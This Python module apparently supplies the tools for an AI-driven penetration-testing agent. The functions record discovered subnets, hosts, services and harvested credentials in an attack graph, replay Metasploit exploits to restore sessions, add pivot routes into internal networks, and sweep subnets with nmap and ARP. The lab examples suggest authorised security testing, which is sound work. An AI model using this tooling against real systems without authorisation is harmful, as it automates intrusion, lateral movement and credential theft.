# core/akg_tools.py
#
# Agno tool wrappers around AttackGraph.
# Called by the Orchestrator to update the AKG during an attack.
#
# Each function:
#   1. Validates inputs
#   2. Calls the appropriate AttackGraph method
#   3. Returns a short confirmation string for the LLM
#
# The graph is persisted automatically after each call.
# The dashboard WebSocket detects file changes and pushes updates live.

import time
from pathlib import Path
from core.knowledge_graph import (
    AttackGraph, Provenance, get_graph, init_graph, get_active_campaign_id,
)


def _g() -> AttackGraph:
    """Shorthand — returns the active graph, lazily initializing from last active campaign if unset."""
    try:
        return get_graph()
    except RuntimeError:
        return init_graph(get_active_campaign_id("drupal-lab"))


def akg_set_campaign(campaign_id: str) -> str:
    """
    Switch or create the active campaign for the Attack Knowledge Graph.
    Call this at the beginning of a run or when the user requests to change campaigns.

    Args:
        campaign_id: Unique campaign identifier (e.g. 'bank-audit-2026', 'drupal-lab').
    """
    safe_id = "".join(c for c in campaign_id if c.isalnum() or c in ("-", "_")).strip()
    if not safe_id:
        return "[AKG Error] Invalid campaign name."

    graph = init_graph(safe_id)
    return f"[AKG] Active campaign set to '{safe_id}'. ({graph.summary()})"


def akg_list_campaigns() -> str:
    """
    List all available campaign folders present on the system.
    """
    base = Path("campaigns")
    if not base.exists():
        return "[AKG] No campaigns found."

    campaigns = [
        d.name for d in base.iterdir()
        if d.is_dir() and (d / "graph.json").exists()
    ]
    if not campaigns:
        return "[AKG] No campaign graphs found."

    return f"[AKG] Available campaigns: {', '.join(sorted(campaigns))}"


def akg_get_current_campaign() -> str:
    """
    Return the name and status of the currently active campaign.
    """
    try:
        g = get_graph()
        return f"[AKG] Current campaign: '{g.campaign_id}' ({g.summary()})"
    except RuntimeError:
        return "[AKG] No campaign currently initialized."


def akg_restore_sessions() -> str:
    """
    Replay the campaign's ExploitStep nodes in exact AKG chronological order.
    At each attempt, verifies that the exploit succeeded before establishing
    any associated pivot routes and proceeding to the next step.
    Halts immediately if an attempt fails.

    Returns:
        Summary report of restored sessions and pivot routes.
    """
    import json as _json
    import time
    import ipaddress
    from core.coder_tools import msf_trigger_exploit
    from core.postexploit_tools import msf_add_route

    g = _g()
    exploit_nodes = g.get_active_sessions()
    if not exploit_nodes:
        return "[AKG Restore] No previous ExploitSteps recorded in this campaign."

    # Sort ExploitStep nodes strictly in chronological order as recorded in AKG
    sorted_nodes = sorted(exploit_nodes, key=lambda n: n.discovered_at or "")

    results = [f"[AKG Restore] Restoring {len(sorted_nodes)} exploit step(s) in AKG order..."]

    _AKG_INTERNAL_KEYS = {
        "session_id", "port", "exploit_module", "payload", "user", "cve",
        "lhost", "lport", "session_type", "target_ip", "target_os", "target_arch",
        "upgraded_from_shell", "upgraded_session_id", "extra_options",
    }

    from core.rpc_client import msf_client
    raw_sessions = msf_client.call("session.list")
    active_sessions = {str(k): v for k, v in raw_sessions.items()} if isinstance(raw_sessions, dict) and "error" not in raw_sessions else {}

    for idx, node in enumerate(sorted_nodes, start=1):
        props = node.properties
        module_path = props.get("exploit_module")
        raw_payload = props.get("payload") or ""
        clean_payload = raw_payload.replace("payload/", "").strip()
        lhost = props.get("lhost")

        # Resolve port: properties -> provenance -> default 80
        rport = props.get("port")
        if rport is None:
            prov = getattr(node, "provenance", None)
            if prov and isinstance(prov, dict):
                rport = prov.get("args", {}).get("rport")
            elif hasattr(node, "provenance") and hasattr(node.provenance, "args"):
                rport = (node.provenance.args or {}).get("rport")
        try:
            rport = int(rport) if rport is not None else 80
        except (ValueError, TypeError):
            rport = 80

        # Resolve target IP: COMPROMISES edge -> properties -> provenance
        target_ip = None
        for edge in g._edges.values():
            if edge.type == "COMPROMISES" and edge.from_node == node.id:
                target_ip = edge.to_node.replace("host-", "")
                break
        if not target_ip:
            target_ip = props.get("target_ip", "")
        if not target_ip and hasattr(node, "provenance") and node.provenance:
            prov_args = getattr(node.provenance, "args", {}) or {}
            target_ip = prov_args.get("rhosts", "")

        if not module_path or not target_ip:
            err_msg = f"Step {idx}/{len(sorted_nodes)}: ExploitStep '{node.id}' is missing module_path or target_ip. Aborting."
            results.append(f"-> FAILED: {err_msg}")
            return "\n".join(results)

        existing_sid = props.get("session_id")
        if existing_sid is not None and str(existing_sid) in active_sessions:
            results.append(
                f"Step {idx}/{len(sorted_nodes)}: Session {existing_sid} on {target_ip} "
                f"is already open and active in Metasploit. Ensuring pivot routes..."
            )
            new_sid = existing_sid
        else:
            # Collect extra options (TARGETURI, SMB_SHARE_NAME, etc.)
            stored_extra = props.get("extra_options") or {}
            if isinstance(stored_extra, str):
                try:
                    stored_extra = _json.loads(stored_extra)
                except Exception:
                    stored_extra = {}
            if not isinstance(stored_extra, dict):
                stored_extra = {}

            # Merge any module options stored flat at top-level of properties
            for k, v in props.items():
                if k not in _AKG_INTERNAL_KEYS and k not in stored_extra:
                    if isinstance(v, (str, int, float, bool)):
                        stored_extra[k] = v

            results.append(
                f"Step {idx}/{len(sorted_nodes)}: Replaying {module_path} on {target_ip}:{rport} "
                f"(payload={clean_payload or 'default'}, opts={stored_extra})..."
            )

            # Execute exploit attempt
            res_json_str = msf_trigger_exploit(
                module_path=module_path,
                rhosts=target_ip,
                rport=rport,
                payload=clean_payload,
                lhost=lhost,
                extra_options=stored_extra if stored_extra else None,
            )

            try:
                res = _json.loads(res_json_str) if isinstance(res_json_str, str) else res_json_str
            except Exception as e:
                results.append(f"-> ERROR parsing exploit response: {e}")
                results.append(f"[AKG Restore] Aborting restore sequence at step {idx}.")
                return "\n".join(results)

            # Controllo che il tentativo sia andato a buon fine
            if res.get("status") != "success" or not res.get("session_id"):
                err_msg = res.get("message") or res.get("hint") or res.get("error") or str(res)
                results.append(f"-> FAILED attempt at step {idx} ({module_path} on {target_ip}): {err_msg}")
                results.append(f"[AKG Restore] Aborting restore sequence because step {idx} did not succeed.")
                return "\n".join(results)

            new_sid = res.get("session_id")
            props["session_id"] = new_sid
            props["payload"] = clean_payload
            sess_details = res.get("session_details", {})
            if isinstance(sess_details, dict) and "type" in sess_details:
                props["session_type"] = sess_details["type"]

            results.append(f"-> SUCCESS: Session {new_sid} established on {target_ip}.")

        # Re-establish pivot routes associated with this exploit step in the AKG
        added_route = False
        for edge in list(g._edges.values()):
            if edge.type == "PIVOTS_INTO" and (edge.from_node == node.id or edge.from_node == f"exploit-{new_sid}"):
                subnet_node = g._nodes.get(edge.to_node)
                sub_cidr = subnet_node.properties.get("cidr", "") if subnet_node else edge.properties.get("route", "")
                
                subnet_ip = ""
                netmask = "255.255.255.0"
                if sub_cidr and "/" in sub_cidr:
                    parts = sub_cidr.split("/")
                    subnet_ip = parts[0]
                    try:
                        prefix = int(parts[1])
                        netmask = str(ipaddress.IPv4Network(f"0.0.0.0/{prefix}").netmask)
                    except Exception:
                        netmask = "255.255.255.0"
                else:
                    sub_raw = edge.to_node.replace("subnet-", "")
                    subnet_ip = sub_raw.split("_")[0].split("/")[0]

                try:
                    msf_add_route(session_id=new_sid, subnet=subnet_ip, netmask=netmask)
                    edge.properties["via_session_id"] = new_sid
                    results.append(f"   └─ Established pivot route to {subnet_ip}/{netmask} via session {new_sid}.")
                    added_route = True
                except Exception as route_err:
                    results.append(f"   └─ WARNING: Failed adding pivot route to {subnet_ip}: {route_err}")

        if added_route:
            time.sleep(2)  # Allow Metasploit routing table to settle before the next hop exploit

        g.save()

    results.append("[AKG Restore] All exploit steps restored successfully.")
    return "\n".join(results)



# ── Reconnaissance phase ──────────────────────────────────────────────────────


def akg_add_subnet(cidr: str, is_attacker_network: bool = None) -> str:
    """
    Register a discovered subnet in the Attack Knowledge Graph.

    Args:
        cidr: Subnet in CIDR notation, e.g. '172.30.0.0/24'.
        is_attacker_network: Optional boolean. If not provided or if set to False for directly
                             reachable networks, automatically detects and adjusts reachability.

    Returns:
        Confirmation string with the node id.
    """
    import ipaddress
    from config import ATTACKER_LHOST

    # Determine if this network is directly reachable by the attacker without pivoting
    if is_attacker_network is not None:
        is_attacker_network = bool(is_attacker_network)
    else:
        is_direct = False
        try:
            net = ipaddress.ip_network(cidr, strict=False)
            if ATTACKER_LHOST and ipaddress.ip_address(ATTACKER_LHOST) in net:
                is_direct = True
            else:
                # Check if Docker MSF or Kali has an interface directly on this subnet
                import subprocess, json as _json
                cmd = ["docker", "ps", "--filter", "publish=55553", "--format", "{{.Names}}"]
                p = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                cname = p.stdout.strip()
                if cname:
                    p2 = subprocess.run(["docker", "inspect", cname], capture_output=True, text=True, timeout=3)
                    info = _json.loads(p2.stdout)
                    if info and isinstance(info, list):
                        nets = info[0].get("NetworkSettings", {}).get("Networks", {})
                        for _, net_info in nets.items():
                            ip_str = net_info.get("IPAddress")
                            prefix = net_info.get("IPPrefixLen", 24)
                            if ip_str:
                                c_net = ipaddress.ip_network(f"{ip_str}/{prefix}", strict=False)
                                if net.overlaps(c_net):
                                    is_direct = True
                                    break
        except Exception:
            is_direct = False
        is_attacker_network = is_direct

    g = _g()
    node = g.add_subnet(
        cidr,
        is_attacker=is_attacker_network,
        provenance=Provenance(tool="akg_add_subnet", args={"cidr": cidr}),
        source="tool",
    )
    g.log(
        event_type="reconnaissance", actor="orchestrator", source="tool",
        action="akg_add_subnet", target=cidr,
        result=f"Subnet {cidr} registered (node: {node.id})",
    )
    return f"[AKG] Subnet registered: {node.id}"


def akg_add_host(ip: str, hostname: str = "", os: str = "",
                 subnet_cidr: str = "") -> str:
    """
    Register a discovered host in the Attack Knowledge Graph.

    Args:
        ip: Host IP address, e.g. '172.28.0.5'.
        hostname: Resolved hostname if available.
        os: Operating system string from nmap/banner (e.g. 'Debian 9').
        subnet_cidr: Parent subnet CIDR to auto-create the CONTAINS edge.

    Returns:
        Confirmation string with the node id.
    """
    from config import ATTACKER_LHOST

    clean_ip = ip.strip()
    if clean_ip == "127.0.0.1" or clean_ip == ATTACKER_LHOST:
        return f"[AKG] Host {clean_ip} ignored (attacker/loopback)"


    g = _g()
    node = g.add_host(
        ip, hostname=hostname, os=os, status="up",
        provenance=Provenance(tool="akg_add_host", args={"ip": ip, "hostname": hostname}),
        source="tool",
    )
    if subnet_cidr:
        # Ensure subnet exists (idempotent) then link
        g.add_subnet(subnet_cidr, provenance=None, source="tool")
        g.link_subnet_host(subnet_cidr, ip, source="tool")
    g.log(
        event_type="reconnaissance", actor="orchestrator", source="tool",
        action="akg_add_host", target=ip,
        result=f"Host {ip} ({hostname or 'unknown'}) registered",
    )
    return f"[AKG] Host registered: {node.id}"



def akg_set_phase_status(ip: str, phase: str, status: str) -> str:
    """
    Update phase progress status (scout, exploit, postexploit) for a target host.

    Args:
        ip: Host IP address, e.g. '172.28.0.5'.
        phase: One of 'scout', 'exploit', 'postexploit'.
        status: One of 'done', 'pending', 'unsuccessful'.

    Returns:
        Confirmation string.
    """
    g = _g()
    g.set_phase_status(ip, phase, status)
    return f"[AKG] Phase '{phase}' for host {ip} updated to '{status}'"


def akg_add_service(host_ip: str, port: int, proto: str = "tcp",
                    service_name: str = "", banner: str = "", cves: str = "",
                    web_path: str = "", ssl: bool = False,
                    target_os: str = "", target_arch: str = "",
                    discovered_paths: list[str] | str | None = None,
                    attributes: dict | None = None,
                    extra_properties: dict | None = None) -> str:
    """
    Register a discovered service on a host.

    Args:
        host_ip:          IP of the host running this service.
        port:             Port number (integer).
        proto:            Protocol, e.g. 'tcp' or 'udp'.
        service_name:     High-level service name, e.g. 'http', 'ssh', 'smb', 'ftp'.
        banner:           Service banner/version string from nmap or curl.
        cves:             Comma-separated CVE IDs discovered for this service, e.g. 'CVE-2018-7600,CVE-2018-7602'.
        web_path:         Specific web endpoint path for HTTP services, e.g. '/showcase.action',
                          '/wp-login.php'. Extracted from curl Location headers or HTML analysis.
                          Passed as TARGETURI when the Coder triggers web exploits.
        ssl:              True if the service uses SSL/TLS (HTTPS, SMTPS, etc.).
        target_os:        Operating system detected for this service, e.g. 'linux', 'windows'.
                          Extract from nmap OS detection field or banner string (e.g. 'Debian', 'Ubuntu').
                          Used by the Coder agent to select the correct payload platform.
        target_arch:      CPU architecture detected, e.g. 'x64', 'x86'.
                          Extract from nmap scripts or banner (e.g. 'x86_64', 'amd64', 'i386').
                          Used by the Coder agent to choose between 32-bit and 64-bit payloads.
        discovered_paths: List of string endpoints discovered on the service (or comma-separated string),
                          e.g. ['/cgi-bin/vulnerable', '/cgi-bin/test.cgi', '/index.html'].
        attributes:       Optional dict of structured metadata (e.g. {'server_headers': {...}, 'ssl': True, 'detected_methods': [...]}).
        extra_properties: Optional dict of arbitrary extra key-value pairs to store in the Service node.

    Returns:
        Confirmation string with the node id.
    """
    g = _g()
    cve_list = [c.strip() for c in cves.split(",") if c.strip()] if cves else []

    paths_list: list[str] = []
    if isinstance(discovered_paths, list):
        paths_list = [str(p).strip() for p in discovered_paths if str(p).strip()]
    elif isinstance(discovered_paths, str) and discovered_paths.strip():
        paths_list = [p.strip() for p in discovered_paths.replace("\n", ",").split(",") if p.strip()]

    node = g.add_service(
        host_ip, port, proto,
        service_name=service_name, banner=banner, cves=cve_list, status="open",
        web_path=web_path, ssl=ssl, target_os=target_os, target_arch=target_arch,
        discovered_paths=paths_list, attributes=attributes,
        extra_properties=extra_properties,
        provenance=Provenance(
            tool="akg_add_service",
            args={"host_ip": host_ip, "port": port, "banner": banner, "discovered_paths": paths_list},
        ),
        source="tool",
    )
    path_info  = f" web_path={web_path}" if web_path else ""
    paths_info = f" paths={paths_list}" if paths_list else ""
    os_info    = f" os={target_os}" if target_os else ""
    arch_info  = f" arch={target_arch}" if target_arch else ""
    ssl_info   = " ssl=True" if ssl else ""
    attrs_info = f" attrs={attributes}" if attributes else ""
    g.log(
        event_type="reconnaissance", actor="orchestrator", source="tool",
        action="akg_add_service", target=f"{host_ip}:{port}",
        result=f"Service {host_ip}:{port} ({service_name or 'unknown'}, {banner[:60]}){path_info}{paths_info}{ssl_info}{os_info}{arch_info}{attrs_info} registered, CVEs: {cve_list or 'none'}",
    )
    return f"[AKG] Service registered: {node.id} CVEs={cve_list or 'none'}{path_info}{paths_info}{os_info}{arch_info}"


def akg_add_interface(host_ip: str, iface_name: str, iface_ip: str,
                      subnet_cidr: str = "", mac: str = "") -> str:
    """
    Register a network interface discovered on a compromised host.

    Args:
        host_ip: IP of the host this interface belongs to.
        iface_name: Interface name, e.g. 'eth0', 'eth1'.
        iface_ip: IP address of this interface.
        subnet_cidr: Subnet this interface belongs to (auto-creates CONNECTS_TO edge).
        mac: MAC address if available.

    Returns:
        Confirmation string.
    """
    g = _g()
    node = g.add_interface(
        host_ip, iface_name, iface_ip, mac=mac,
        provenance=Provenance(tool="akg_add_interface",
                              args={"host_ip": host_ip, "iface": iface_name, "ip": iface_ip}),
        source="tool",
    )
    if subnet_cidr:
        g.add_subnet(subnet_cidr, provenance=None, source="tool")
        g.link_interface_subnet(host_ip, iface_name, subnet_cidr, source="tool")
    g.log(
        event_type="post_exploitation", actor="orchestrator", source="tool",
        action="akg_add_interface", target=host_ip,
        result=f"Interface {iface_name} ({iface_ip}) on {host_ip}",
    )
    return f"[AKG] Interface registered: {node.id}"


# ── Exploitation phase ────────────────────────────────────────────────────────


def akg_record_exploit(session_id: int, host_ip: str, port: int,
                       exploit_module: str, payload: str, user: str,
                       cve: str = "", lhost: str = "",
                       session_type: str = "meterpreter",
                       extra_properties: dict | None = None) -> str:
    """
    Record a successful exploitation as an ExploitStep node.
    Automatically creates EXPLOITED_VIA and COMPROMISES edges.

    Args:
        session_id: Metasploit session ID returned by msf_trigger_exploit.
        host_ip: IP of the compromised host.
        port: Port of the exploited service.
        exploit_module: Full Metasploit module path, e.g. 'exploit/unix/webapp/drupal_drupalgeddon2'.
        payload: Payload used, e.g. 'php/meterpreter/reverse_tcp'.
        user: Execution user on target, e.g. 'www-data', 'root'.
        cve: Primary CVE exploited, e.g. 'CVE-2018-7600'.
        lhost: Attacker callback IP.
        session_type: 'meterpreter' or 'shell'.
        extra_properties: Optional dict of extra parameters passed to exploit (e.g. TARGETURI, HTTP_METHOD).

    Returns:
        Confirmation string with session id and privilege level.
    """
    clean_payload = (payload or "").replace("payload/", "").strip()
    g = _g()
    node = g.add_exploit_step(
        session_id, host_ip, port, exploit_module, clean_payload, user,
        cve=cve, lhost=lhost, session_type=session_type,
        extra_properties=extra_properties,
        provenance=Provenance(
            tool="msf_trigger_exploit",
            args={"module_path": exploit_module, "rhosts": host_ip, "rport": port},
        ),
        source="tool",
    )
    g.log(
        event_type="exploitation", actor="orchestrator", source="tool",
        action="akg_record_exploit", target=f"{host_ip}:{port}",
        result=f"Session {session_id} opened ({session_type}, {user}) via {exploit_module}",
    )
    return (
        f"[AKG] ExploitStep recorded: {node.id} | "
        f"host={host_ip} port={port} user={user} session={session_id}"
    )


def akg_update_session_id(old_session_id: int, new_session_id: int, new_session_type: str = "meterpreter") -> str:
    """
    Update an existing ExploitStep node and its edges when a session is upgraded
    or renewed (e.g. via msf_upgrade_shell_to_meterpreter).

    Args:
        old_session_id: The previous session ID (e.g. 2).
        new_session_id: The new session ID (e.g. 3).
        new_session_type: Type of the new session (default 'meterpreter').

    Returns:
        Confirmation string.
    """
    g = _g()
    updated = False
    for node in g._nodes.values():
        if node.type == "ExploitStep":
            props = node.properties
            if str(props.get("session_id")) == str(old_session_id):
                props["session_id"] = int(new_session_id) if str(new_session_id).isdigit() else new_session_id
                props["session_type"] = new_session_type
                updated = True
                break

    if updated:
        # Update any edges referencing via_session_id
        for edge in g._edges.values():
            if edge.type == "PIVOTS_INTO":
                if str(edge.properties.get("via_session_id")) == str(old_session_id):
                    edge.properties["via_session_id"] = int(new_session_id) if str(new_session_id).isdigit() else new_session_id

        g.save()
        g.log(
            event_type="session_upgrade", actor="orchestrator", source="tool",
            action="akg_update_session_id", target=f"session:{old_session_id}",
            result=f"Session {old_session_id} updated to {new_session_id} ({new_session_type})"
        )
        return f"[AKG] Session updated: {old_session_id} -> {new_session_id} ({new_session_type})"
    
    return f"[AKG Warning] Session {old_session_id} not found in graph to update."


# ── Post-exploitation phase ───────────────────────────────────────────────────


def akg_add_credential(exploit_session_id: int, cred_type: str,
                       label: str, location: str,
                       username: str = "", secret: str = "") -> str:
    """
    Record a harvested credential (password, hash, key, token).

    Args:
        exploit_session_id: The session from which this credential was extracted.
        cred_type: Type of credential: 'plaintext', 'shadow_hash', 'md5', 'ssh_key', 'hash_salt', 'token'.
        label: Human-readable label, e.g. 'SSH private key — msfadmin'.
        location: Where it was found, e.g. '/etc/shadow', 'env vars'.
        username: Associated username if known.
        secret: The actual secret value (e.g. password, hash, or complete private key).

    Returns:
        Confirmation string with node id.
    """
    g = _g()
    node = g.add_credential(
        exploit_session_id, cred_type, label, location,
        username=username, secret=secret,
        provenance=Provenance(
            tool="msf_session_command",
            args={"session_id": exploit_session_id, "location": location},
        ),
        source="tool",
    )
    g.log(
        event_type="credential_found", actor="orchestrator", source="tool",
        action="akg_add_credential", target=f"session:{exploit_session_id}",
        result=f"{cred_type} credential found at {location} (user: {username or 'unknown'})",
    )
    return f"[AKG] Credential recorded: {node.id} type={cred_type}"


def akg_add_pivot(exploit_session_id: int, subnet_cidr: str,
                  route: str = "") -> str:
    """
    Record a pivot route established through a session.
    Creates a PIVOTS_INTO edge from the ExploitStep to the target Subnet.

    Args:
        exploit_session_id: Session used as pivot (e.g. session 31).
        subnet_cidr: Internal subnet now reachable via this pivot.
        route: MSF route string, e.g. '172.30.0.0/255.255.255.0'.

    Returns:
        Confirmation string.
    """
    g = _g()
    # Ensure subnet node exists
    g.add_subnet(subnet_cidr, is_attacker=False, source="tool")
    g.add_pivot(
        exploit_session_id, subnet_cidr, route=route,
        provenance=Provenance(
            tool="msf_add_route",
            args={"session_id": exploit_session_id, "subnet": subnet_cidr},
        ),
        source="tool",
    )
    g.log(
        event_type="pivot", actor="orchestrator", source="tool",
        action="akg_add_pivot", target=subnet_cidr,
        result=f"Pivot route via session {exploit_session_id} → {subnet_cidr}",
    )
    return f"[AKG] Pivot registered: session {exploit_session_id} → {subnet_cidr}"


# ── Decision logging ──────────────────────────────────────────────────────────


def akg_log_decision(actor: str, action: str, target: str,
                     reasoning: str, result: str) -> str:
    """
    Log an Orchestrator decision (source='model') in the event log.
    Use this to record strategic choices: exploit selection, next hop, abort.

    Args:
        actor: Who made the decision, e.g. 'orchestrator'.
        action: Decision keyword, e.g. 'exploit_selection', 'next_hop_decision', 'chain_complete'.
        target: Target of the decision (IP, subnet, or 'null').
        reasoning: Why this decision was made (LLM reasoning, 1-3 sentences).
        result: What was decided, e.g. 'exploit/unix/webapp/drupal_drupalgeddon2'.

    Returns:
        Confirmation string.
    """
    g = _g()
    g.log(
        event_type="decision", actor=actor, source="model",
        action=action, target=target or None,
        reasoning=reasoning, result=result,
    )
    return f"[AKG] Decision logged: {action} → {result}"


# ── Status / Context query ───────────────────────────────────────────────────


def akg_get_context() -> str:
    """
    Return full structured context of the Attack Knowledge Graph state.
    Includes target hosts, phase progress (scout, exploit, post_exploit), sessions, pivots, and creds.

    Returns:
        Detailed markdown-formatted graph context string.
    """
    return _g().full_context()


def akg_get_next_targets() -> str:
    """
    Return the list of discovered hosts not yet compromised, annotated with depth and access routing.
    Use this at PHASE 5 (NEXT HOP DECISION) to pick the next attack target.

    Returns:
        Formatted string listing candidate IPs with network depth and required route.
    """
    g = _g()
    targets = g.get_next_targets()
    if not targets:
        return "[AKG] No uncompromised targets found. Chain may be complete."
    
    try:
        _, host_info = g._compute_network_topology()
        lines = ["[AKG] Candidate targets to attack (annotated by depth & routing):"]
        for ip in targets:
            info = host_info.get(ip, {})
            tier = info.get("tier", "Unknown Tier")
            route = info.get("route", "Direct")
            role = info.get("role", "Target")
            lines.append(f"  - Host {ip} | Depth: {tier} | Route: {route} | Role: {role}")
        return "\n".join(lines)
    except Exception:
        return f"[AKG] Next targets: {targets}"


def orchestrator_discover_subnet(subnet_cidr: str) -> str:
    """
    Host discovery tool for the ORCHESTRATOR agent.
    Scans the target subnet to discover all live host IPs regardless of which ports
    are open (even if non-standard ports or stealth firewalls are present).
    Automatically registers the subnet and all discovered hosts in the AKG.

    Args:
        subnet_cidr: Subnet in CIDR notation (e.g. "192.168.1.0/24", "192.168.0.0/16").
    """
    import subprocess
    import xml.etree.ElementTree as ET
    import json
    import ipaddress
    from config import ATTACKER_LHOST

    akg_add_subnet(subnet_cidr, is_attacker_network=True)

    target_net = None
    try:
        target_net = ipaddress.ip_network(subnet_cidr, strict=False)
    except Exception:
        pass

    # 1. Prefer an attacker container attached directly to the target network
    runner = None
    try:
        for name in ("msf-rpc", "kali"):
            r = subprocess.run(
                ["docker", "ps", "--filter", f"name={name}", "--filter", "status=running", "-q"],
                capture_output=True, text=True, timeout=2
            )
            if r.returncode == 0 and r.stdout.strip():
                for c_id in r.stdout.strip().split():
                    if target_net:
                        net_inspect = subprocess.run(
                            ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}", c_id],
                            capture_output=True, text=True, timeout=2
                        )
                        if net_inspect.returncode == 0:
                            for c_ip in net_inspect.stdout.strip().split():
                                try:
                                    if ipaddress.ip_address(c_ip) in target_net:
                                        runner = c_id
                                        break
                                except Exception:
                                    pass
                    if runner:
                        break
            if runner:
                break

        # Fallback to any running msf-rpc or kali container
        if not runner:
            for name in ("msf-rpc", "kali"):
                r = subprocess.run(
                    ["docker", "ps", "--filter", f"name={name}", "--filter", "status=running", "-q"],
                    capture_output=True, text=True, timeout=2
                )
                if r.returncode == 0 and r.stdout.strip():
                    runner = r.stdout.strip().split()[0]
                    break
    except Exception:
        runner = None

    if runner:
        cmd = ["docker", "exec", runner, "nmap", "-sn", "-n", "--min-rate", "20000", "--max-retries", "1", "-oX", "-", subnet_cidr]
    else:
        import shutil
        if shutil.which("nmap"):
            cmd = ["nmap", "-sn", "-n", "--min-rate", "20000", "--max-retries", "1", "-oX", "-", subnet_cidr]
        else:
            cmd = ["docker", "run", "--rm", "--network", "host", "instrumentisto/nmap", "--unprivileged", "-sn", "-Pn", "-n", "--min-rate", "20000", "--max-retries", "1", "-oX", "-", subnet_cidr]

    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        root = ET.fromstring(res.stdout) if res.stdout.strip() else None
    except Exception:
        root = None

    discovered_hosts = []
    seen_ips = set()

    # 1. Collect hosts confirmed Up directly by Nmap responses
    if root is not None:
        for host in root.findall("host"):
            status = host.find("status")
            if status is None or status.get("state") != "up":
                continue
            addr_el = host.find("address[@addrtype='ipv4']")
            if addr_el is None:
                continue
            ip = addr_el.get("addr")
            if ip in seen_ips or ip == ATTACKER_LHOST or ip == "127.0.0.1":
                continue
            hostname = ""
            h_el = host.find("hostnames/hostname")
            if h_el is not None:
                hostname = h_el.get("name", "")
            seen_ips.add(ip)
            akg_add_host(ip=ip, hostname=hostname, subnet_cidr=subnet_cidr)
            discovered_hosts.append({"ip": ip, "hostname": hostname})

    # 2. Kernel ARP harvesting (Layer 2 discovery: finds hosts on local subnet even with DROP firewalls and custom ports)
    try:
        if runner:
            arp_proc = subprocess.run(["docker", "exec", runner, "cat", "/proc/net/arp"], capture_output=True, text=True, timeout=5)
            arp_content = arp_proc.stdout if arp_proc.returncode == 0 else ""
        else:
            with open("/proc/net/arp", "r") as f:
                arp_content = f.read()

        if arp_content:
            target_net = ipaddress.ip_network(subnet_cidr, strict=False)
            for line in arp_content.splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 4:
                    ip, flags, mac = parts[0], parts[2], parts[3]
                    # flags 0x2 = complete/valid ARP entry (host physically responded at Layer 2)
                    if flags == "0x2" and mac != "00:00:00:00:00:00":
                        try:
                            if ipaddress.ip_address(ip) in target_net:
                                if ip not in seen_ips and ip != ATTACKER_LHOST and ip != "127.0.0.1":
                                    seen_ips.add(ip)
                                    akg_add_host(ip=ip, hostname="", subnet_cidr=subnet_cidr)
                                    discovered_hosts.append({"ip": ip, "hostname": ""})
                        except Exception:
                            pass
    except Exception:
        pass

    return json.dumps({
        "status": "success",
        "subnet": subnet_cidr,
        "live_hosts_count": len(discovered_hosts),
        "hosts": discovered_hosts
    })

